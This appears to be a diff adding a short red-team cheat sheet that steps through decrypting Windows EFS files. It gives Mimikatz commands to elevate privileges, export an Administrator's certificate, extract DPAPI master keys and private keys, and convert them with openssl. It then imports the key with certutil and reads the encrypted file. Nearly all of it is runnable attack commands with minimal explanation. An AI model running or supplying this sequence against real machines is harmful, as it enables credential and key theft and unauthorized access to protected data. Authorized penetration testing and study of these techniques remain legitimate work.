@@ -1,0 +1,22 @@
+# Decrypt EFS Files
+# https://morph3sec.com/Cheat-Sheets/Windows-Red-Team-Cheat-Sheet/
+# Follow the link here How to Decrypt EFS Files
+# https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
+
+privilege::debug 
+token::elevate 
+crypto::system /file:"C:\Users\Administrator\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\thecert" /export
+dpapi::capi /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\SID\id"
+
+# Clear text password 
+dpapi::masterkey /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\SID\masterkey" /password:pass123
+
+# After this command you must have the exported .der and .pvk files
+dpapi::capi /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\SID\id" /masterkey:f2c9ea33a990c865e985c496fb8915445895d80b
+openssl x509 -inform DER -outform PEM -in blah.der -out public.pem
+openssl rsa -inform PVK -outform PEM -in blah.pvk -out private.pem
+openssl pkcs12 -in public.pem -inkey private.pem -password pass:randompass -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+# Import the certificate
+certutil -user -p randompass -importpfx cert.pfx NoChain,NoRoot
+type "C:\Users\Administrator\Documents\encrypted.txt"
